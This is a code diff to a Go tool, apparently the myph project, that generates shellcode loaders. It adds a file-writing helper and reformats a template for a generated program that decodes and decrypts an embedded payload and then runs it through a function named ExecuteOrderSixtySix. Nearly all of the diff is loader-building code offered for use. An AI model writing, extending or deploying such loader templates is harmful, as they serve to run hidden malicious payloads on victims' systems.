@@ -4,10 +4,23 @@ import (
 	"bytes"
 	"fmt"
 	"io"
+	"math/rand"
 	"os"
-    "math/rand"
 )
 
+
+func WriteToFile(outfile string, filname string, toWrite string) error {
+
+    full_path := fmt.Sprintf("%s/%s", outfile, filname)
+    file, err := os.OpenFile(full_path, os.O_TRUNC | os.O_WRONLY, 0644)
+    if err != nil {
+        return err
+    }
+
+    file.WriteString(toWrite)
+    file.Close()
+    return nil
+}
 
 func RandomString(n int) string {
 	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
@@ -65,9 +78,10 @@ func CreateTmpProjectRoot(path string) error {
     }
 
     var go_mod = []byte(`
-        module github.com/cmepw/myph
+module github.com/cmepw/myph
 
-        go 1.20
+go 1.20
+
     `)
 
     gomod_path := fmt.Sprintf("%s/go.mod", path)
@@ -90,28 +104,28 @@ func CreateTmpProjectRoot(path string) error {
 
 func GetMainTemplate(encoding string, key string, sc string) string {
     return fmt.Sprintf(`
-        package main
+package main
 
-        import (
-            enc "encoding/%s"
-        )
+import (
+    "os"
+    enc "encoding/%s"
+)
 
-        var Key = %s
-        var Code = %s
+var Key = %s
+var Code = %s
 
-        func main() {
+func main() {
 
-            decodedSc := enc.DecodeFromString(Code)
-            decodedKey := enc.DecodeFromString(Key)
+    decodedSc := enc.DecodeFromString(Code)
+    decodedKey := enc.DecodeFromString(Key)
 
-            decrypted, err := Decrypt(decodedSc, decodedKey)
-            if err != nil {
-                return nil
-            }
+    decrypted, err := Decrypt(decodedSc, decodedKey)
+    if err != nil {
+        os.Exit(1)
+    }
 
-            ExecuteOrderSixtySix(decrypted)
-        }
-
+    ExecuteOrderSixtySix(decrypted)
+}
     `, encoding, key, sc)
 
 }
